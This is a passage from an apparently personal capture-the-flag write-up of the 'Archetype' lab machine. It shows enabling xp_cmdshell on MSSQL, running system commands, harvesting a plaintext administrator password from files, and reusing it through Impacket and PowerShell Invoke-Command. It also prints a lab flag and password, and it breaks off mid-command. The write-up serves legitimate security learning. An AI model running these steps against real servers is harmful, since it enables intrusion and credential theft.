<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sp_configure </span><span class="token string" style="color:#e3116c">&#x27;xp_cmdshell&#x27;</span><span class="token plain">, </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> INFO</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ARCHETYPE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Line </span><span class="token number" style="color:#36acaa">185</span><span class="token plain">: Configuration option </span><span class="token string" style="color:#e3116c">&#x27;xp_cmdshell&#x27;</span><span class="token plain"> changed from </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> to </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">. Run the RECONFIGURE statement to install.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I then ran <code>reconfigure</code> as requested. I was now able to run any commands on the machine.
Since I speak a little bit of Batch, I ran a command to see which directory we’re currently in:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> xp_cmdshell </span><span class="token string" style="color:#e3116c">&quot;echo The current directory is %CD%&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">output                                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------------------------------------------------------------------------------   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The current directory is C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">system32                                       </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">output                                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------------------------------------------------------------------------------   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">archetype</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">sql_svc </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Looks like the user we’re currently logged in with <code>sql_svc</code> who can run remote commands on the system. So now all that is left is to read the contents of the user flag in the desktop:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> xp_cmdshell </span><span class="token string" style="color:#e3116c">&quot;type c:\Users\sql_svc\Desktop\user.txt&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">output                                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------------------------------------------------------------------------------   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3e7b102e78218e935bf3f4951fec21a3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I was delighted at this point. But still had my eyes to the second and more challenging part: retrieve the administrator’s flag.
I attempted to access the path where the flag is located but unfortunately I could not access it:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> xp_cmdshell </span><span class="token string" style="color:#e3116c">&quot;cd c:\Users\Administrator\Desktop&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">output                                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------------------------------------------------------------------------------   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Access is denied.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I decided, since I had access to the C: drive, it was worth to do a recursive search in the drive to see if we can find the word “administrator” in some file (since we know that only the administrator account can access the flag on its desktop):
I spawned a new PowerShell process and ran the following command only to be stopped because of denial to search in a particular path (The Event Viewer logs):</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SQL&gt;xp_cmdshell </span><span class="token string" style="color:#e3116c">&quot;powershell &quot;</span><span class="token function" style="color:#d73a49">Get-ChildItem</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Recurse </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Select-String</span><span class="token plain"> administrator </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">List </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Select</span><span class="token plain"> Path</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Select-String</span><span class="token plain"> : The file C:\Windows\system32\winevt\Logs\Windows PowerShell</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">evtx cannot be read: Access to the path    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;C:\Windows\system32\winevt\Logs\Windows PowerShell.evtx&#x27;</span><span class="token plain"> is denied</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">               </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">At line:1 char:26                                                                  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Get-ChildItem</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Recurse </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Select-String</span><span class="token plain"> administrator </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">List </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Select</span><span class="token plain"> P </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token plain">                          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                       </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> CategoryInfo          : InvalidArgument: </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">:</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">[Select-String]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ArgumentException   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> FullyQualifiedErrorId : ProcessingFile</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">PowerShell</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Commands</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">SelectStringCommand   </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I altered the command a bit and added the flag <code>-ErrorAction SilentlyContinue</code> to prevent the script from from stopping. Let me break down each part to explain what it’s intended to do.
The first part retrieves all files and directories from the <code>sql_svc</code> home folder recursively. <a href="https://superuser.com/questions/150748/have-powershell-get-childitem-return-files-only" target="_blank" rel="noopener noreferrer">The <code>-File</code> flag ensures the cmdlet only returns files. The <code>-Force</code> flag is important here because it searches for all files (even hidden ones)</a>:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Get-ChildItem</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Path C:\Users\sql_svc </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Recurse </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Force </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ErrorAction SilentlyContinue </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">File</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We then pipe the list of all files and folders into the following command:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Get-Content</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ErrorAction SilentlyContinue</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This will read the contents of each file that was piped into the command and print it to the console.
The last part of the command performs a case-insensitive search for the word ‘administrator’ in all the piped content:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Select-String</span><span class="token plain"> administrator </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ErrorAction SilentlyContinue</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Putting it all together and displaying the output, we see that one of the files that was read had a command that included the word ‘administrator’!</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SQL&gt; xp_cmdshell </span><span class="token string" style="color:#e3116c">&quot;powershell &quot;</span><span class="token function" style="color:#d73a49">Get-ChildItem</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Path C:\Users\sql_svc </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Recurse </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Force </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ErrorAction SilentlyContinue </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Get-Content</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ErrorAction SilentlyContinue</span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Select-String</span><span class="token plain"> administrator </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ErrorAction SilentlyContinue</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">output                                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token plain">   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe use T: \\Archetype\backups </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">user:administrator MEGACORP_4dm1n!</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">            </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The command <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)" target="_blank" rel="noopener noreferrer">maps the T drive to the backups share using the administrator account</a>. And we can see that the last argument includes the administrator password!
All that’s left is to either log in with the administrator credentials to SQL Server or find a way to run a command as the administrator and then read the contents of the flag.
The attempt for the former failed:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mssqlclient.py ARCHETYPE/administrator:MEGACORP_4dm1n</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">!</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">@</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"> -windows-auth</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.9.22 - Copyright </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain"> SecureAuth Corporation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Encryption required, switching to TLS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> ERROR</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ARCHETYPE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Line </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: Login failed </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> user </span><span class="token string" style="color:#e3116c">&#x27;ARCHETYPE\administrator&#x27;</span><span class="token builtin class-name">.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This is because there’s no such user in the database (logged in with <code>sql_svc</code> user):</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> name </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> sys</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">database_principals</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dbo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">guest</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">INFORMATION_SCHEMA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">##MS_PolicyEventProcessingLogin##</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">##MS_AgentSigningCertificate##</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_owner</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_accessadmin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_securityadmin </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_ddladmin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_backupoperator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_datareader</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_datawriter</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_denydatareader</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_denydatawriter                               </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So I needed to try the latter approach: run the command to read the flag as administrator.
I did some research and found <a href="https://superuser.com/a/1421775/506517" target="_blank" rel="noopener noreferrer">a way to do this using PowerShell</a>. I ran the following command to specify the administrator credentials and print the contents of the flag:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> xp_cmdshell </span><span class="token string" style="color:#e3116c">&quot;powershell &quot;</span><span class="token plain">$username</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">\&quot;administrator\&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">$password</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">\&quot;MEGACORP_4dm1n</span><span class="token operator" style="color:#393A34">!</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">\&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">$pass </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ConvertTo</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">SecureString </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">AsPlainText $Password </span><span class="token operator" style="color:#393A34">-</span><span class="token keyword" style="color:#00009f">Force</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">$Cred </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> New</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Object System</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Management</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Automation</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">PSCredential </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ArgumentList $Username</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">$pass</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">Invoke</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ComputerName \&quot;Archetype\&quot; </span><span class="token operator" style="color:#393A34">-</span><span class="token 